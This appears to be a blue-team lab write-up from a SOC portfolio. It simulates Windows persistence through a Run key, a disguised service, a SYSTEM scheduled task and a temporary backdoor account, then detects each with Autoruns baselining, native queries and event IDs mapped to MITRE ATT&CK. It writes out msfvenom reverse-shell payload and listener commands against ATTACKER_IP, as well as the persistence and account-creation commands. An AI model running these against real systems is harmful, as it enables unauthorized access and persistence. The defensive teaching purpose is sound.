<div align="center">

# 🛡️ Endpoint Security Monitoring
## Lab 1: Windows Persistence Techniques & Detection

![Category](https://img.shields.io/badge/Category-Endpoint%20Security-blue?style=for-the-badge&logo=windows&logoColor=white)
![Tools](https://img.shields.io/badge/Tools-Metasploit%20%7C%20Autoruns%20%7C%20PowerShell-critical?style=for-the-badge)

*Part of the [SOC Lab Portfolio](https://github.com/Anzar-Ahmed/SOC-Lab-Portfolio) — hands-on Blue Team detection engineering*

</div>

---

## 📑 Table of Contents
- [Objective](#objective)
- [Tools Used](#tools-used)
- [Step-by-Step Investigation](#step-by-step-investigation)
- [IOC Findings](#ioc-findings)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Conclusion](#conclusion)
- [Key Learning](#key-learning)

---

## 🎯 Objective
To simulate common Windows persistence techniques used by attackers post-exploitation (Registry Run Keys, Windows Services, and Scheduled Tasks), and to detect, analyze, and validate these techniques using native Windows tools, Sysinternals Autoruns, and Windows Event Logs — from a SOC Analyst / Blue Team perspective.

## 🧰 Tools Used
| Tool | Purpose |
|---|---|
| Metasploit Framework (msfvenom, msfconsole) | Payload generation and reverse shell listener (attacker simulation) |
| Python HTTP Server | Payload delivery to victim machine |
| CMD / PowerShell | Native Windows enumeration, registry, and service inspection |
| WMIC | Process and system information queries |
| Process Explorer | Process-level analysis |
| Windows Registry Editor | Manual inspection of persistence keys |
| Sysinternals Autoruns (GUI + PowerShell module) | Startup/persistence baseline comparison |
| Windows Event Viewer / wevtutil | Security and System log analysis |

---

## 🔍 Step-by-Step Investigation

### 1. Payload Creation & Delivery (Attacker Simulation)
**Action Taken:** Generated a Windows reverse shell payload and set up a listener to simulate initial access, then delivered the payload via a local web server.

**Command/Query:**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o payload.exe

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit

python3 -m http.server 8000
```

**Screenshot:**
`![Payload creation and listener setup](screenshots/01-payload-listener.png)`

**Observation:** A Meterpreter session was successfully established after the victim machine executed the payload, confirming a reverse TCP connection back to the attacker-controlled listener on port 4444.

**Result:** Initial access simulated successfully — session used as the basis for post-exploitation persistence testing.

---

### 2. Network & Process Enumeration (Post-Exploitation)
**Action Taken:** Enumerated active network sessions, shared resources, and running processes on the compromised host.

**Command/Query:**
```
net view
net share
net session
net use
netstat -anob
tasklist
tasklist /V
tasklist /FI "PID eq 2088" /M
wmic process where processid=2088 get name,parentprocessid,processid
```

**Screenshot:**
`![Process and network enumeration](screenshots/02-process-enumeration.png)`

**Observation:** Identified active connections tied to the payload process and cross-referenced process IDs with parent processes using WMIC to trace execution lineage.

**Result:** Confirmed the payload process and its network activity, establishing a baseline for anomaly detection.

---

### 3. Registry Persistence (Run Keys)
**Action Taken:** Created a Registry Run Key to simulate an attacker establishing persistence, then verified it manually via Registry Editor, CMD, and PowerShell.

**Command/Query:**
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NotABackdoor /t REG_SZ /d "C:\Users\Anzar\Downloads\notmalware.exe" /f

reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
```

**Screenshot:**
`![Registry Run key persistence](screenshots/03-registry-run-key.png)`

**Observation:** The malicious entry `NotABackdoor` pointing to a suspicious executable in the Downloads folder appeared under the `Run` key — a classic auto-start persistence location.

**Result:** Confirmed persistence via Registry Run Key; validated using both native CMD/PowerShell and manual Registry Editor navigation.

---

### 4. Windows Service Persistence
**Action Taken:** Created a fake Windows service disguised with a legitimate-sounding name to simulate service-based persistence, then investigated it using service query commands.

**Command/Query:**
```
sc create BackupService binPath= "C:\Users\Anzar\Downloads\notmalware.exe" start= auto

net start
sc query
sc query= all
sc query BackupService
sc qc BackupService
```

**Screenshot:**
`![Windows service persistence](screenshots/04-service-persistence.png)`

**Observation:** `sc qc BackupService` revealed the `BINARY_PATH_NAME` pointing to an executable in the Downloads directory with `START_TYPE = AUTO_START` — both are strong indicators of malicious service persistence, since legitimate services rarely run from user profile folders.

**Result:** Identified suspicious service configuration consistent with attacker-created persistence disguised as a legitimate backup service.

---

### 5. Scheduled Task Persistence
**Action Taken:** Created a scheduled task running under the SYSTEM account to simulate high-privilege persistence, then queried and validated it.

**Command/Query:**
```
schtasks /create /tn "SystemCleanup" /tr "C:\Users\Anzar\Downloads\notmalware.exe" /sc daily /st 09:00 /ru SYSTEM

schtasks /query /fo LIST
schtasks /query /tn "SystemClean"
schtasks /query /tn "SystemClean" /v /fo LIST
```

**Screenshot:**
`![Scheduled task persistence](screenshots/05-scheduled-task.png)`

**Observation:** The task was configured to run daily under the SYSTEM account — a red flag, since SYSTEM-level scheduled tasks executing unsigned binaries from user directories are a common privilege escalation and persistence pattern.

**Result:** Confirmed scheduled task persistence with elevated privileges; cross-verified via CMD and Autoruns GUI.

---

### 6. Autoruns Baseline Comparison (Detection Workflow)
**Action Taken:** Used the Sysinternals Autoruns PowerShell module to create a clean baseline before persistence changes, then captured a post-change state and compared both to isolate the injected persistence artifacts.

**Command/Query:**
```
Get-PSAutorun -VerifyDigitalSignature | Where-Object { -not($_.IsOSBinary) } | New-AutoRunsBaseLine -Verbose -FilePath .\Baseline.ps1

Get-PSAutorun -VerifyDigitalSignature | Where-Object { -not($_.IsOSBinary) } | New-AutoRunsBaseLine -Verbose -FilePath .\CurrentState.ps1 -Force

Compare-AutoRunsBaseLine -ReferenceBaseLineFile .\Baseline.ps1 -DifferenceBaseLineFile .\CurrentState.ps1 -Verbose

Compare-AutoRunsBaseLine -ReferenceBaseLineFile .\Baseline.ps1 -DifferenceBaseLineFile .\CurrentState.ps1 | Where-Object { $_.SideIndicator -eq "=>" }
```

**Screenshot:**
`![Autoruns baseline comparison](screenshots/06-autoruns-comparison.png)`

**Observation:** The filtered comparison (`SideIndicator -eq "=>"`) isolated exactly the new entries added after the baseline — the Registry Run key, the service, and the scheduled task — with no noise from legitimate OS binaries.

**Result:** Demonstrated an efficient, repeatable baseline-diffing workflow for detecting new persistence mechanisms on a Windows endpoint.

---

### 7. Event Log Analysis (Account Creation/Deletion)
**Action Taken:** Simulated attacker account creation and cleanup, then queried Security event logs for the corresponding events.

**Command/Query:**
```
net user backdoor password /add
net user backdoor /delete

wevtutil qe security /c:5 /f:text /rd:true
wevtutil qe security /c:5 /f:text /rd:true /q:"*[System[(EventID=4720)]]"
```

**Screenshot:**
`![Event log analysis](screenshots/07-event-log-analysis.png)`

**Observation:** Event ID 4720 (user account created) and Event ID 4726 (user account deleted) were logged in quick succession — a pattern consistent with an attacker creating a temporary backdoor account and removing it to cover tracks.

**Result:** Validated detection of suspicious account lifecycle activity via native Windows Event Log querying.

---

## 🚩 IOC Findings

| Indicator | Type | Description |
|---|---|---|
| `payload.exe` / `notmalware.exe` | File Name | Malicious executable dropped in `Downloads` directory |
| Port 4444 | Network | Default Meterpreter reverse TCP listener port |
| `NotABackdoor` | Registry Value | Suspicious Run key entry under `HKCU\...\CurrentVersion\Run` |
| `BackupService` | Service Name | Fake Windows service disguised with legitimate-sounding name |
| `SystemCleanup` / `SystemClean` | Scheduled Task Name | Task running under SYSTEM with daily trigger |
| `backdoor` | User Account | Temporary local account created and deleted to test account-based footholds |
| Event ID 4720 / 4726 | Security Log | User account created / deleted |
| Event ID 7045 | System Log | New service installed |

---

## 🗺️ MITRE ATT&CK Mapping

| Technique ID | Technique Name | Observed Activity |
|---|---|---|
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Persistence via `HKCU\...\CurrentVersion\Run` |
| T1543.003 | Create or Modify System Process: Windows Service | `BackupService` created via `sc create` |
| T1053.005 | Scheduled Task/Job: Scheduled Task | `SystemCleanup` task via `schtasks` |
| T1036 | Masquerading | Legitimate-sounding names used for service/task (BackupService, SystemCleanup) |
| T1136.001 | Create Account: Local Account | `backdoor` account created via `net user` |
| T1070 | Indicator Removal | `backdoor` account deleted after creation |
| T1057 | Process Discovery | `tasklist`, WMIC process queries |
| T1049 | System Network Connections Discovery | `netstat -anob` |
| T1018 | Remote System Discovery | `net view` |
| T1135 | Network Share Discovery | `net share` |
| T1012 | Query Registry | `reg query`, `Get-ItemProperty` |

---

## ✅ Conclusion
This lab simulated three of the most common Windows persistence techniques — Registry Run Keys, Windows Services, and Scheduled Tasks — and walked through the full detection lifecycle: manual registry/service/task inspection, automated baseline-diffing with Autoruns, and Security Event Log correlation. Each persistence method left identifiable artifacts (suspicious file paths, auto-start configurations, and privileged execution contexts) that a SOC Analyst can systematically detect using native Windows tools without relying solely on third-party EDR alerts.

## 💡 Key Learning
- Persistence mechanisms almost always share common red flags: **execution from user-writable directories** (Downloads, AppData, Temp), **auto-start configuration**, and **legitimate-sounding but unverified names**.
- Baseline-and-compare (Autoruns PowerShell module) is a far more scalable detection method than manually checking each persistence location one by one.
- Native Windows tools (`reg`, `sc`, `schtasks`, `wevtutil`) are sufficient for most persistence detection — no special tooling required, which matters in resource-constrained SOC environments.
- Event ID correlation (4720/4726 for accounts, 7045 for services) turns raw log noise into an actionable timeline of attacker behavior.

---

<div align="center">

### 📂 Navigate Portfolio

[⬅️ Back to Main Portfolio](https://github.com/Anzar-Ahmed/SOC-Lab-Portfolio) &nbsp;|&nbsp; [Phishing Analysis](../01-Phishing-Analysis) &nbsp;|&nbsp; [SIEM Analysis ➡️](../03-SIEM-Analysis)

**Author:** Anzar Ahmed &nbsp;•&nbsp; [GitHub](https://github.com/Anzar-Ahmed)

</div>
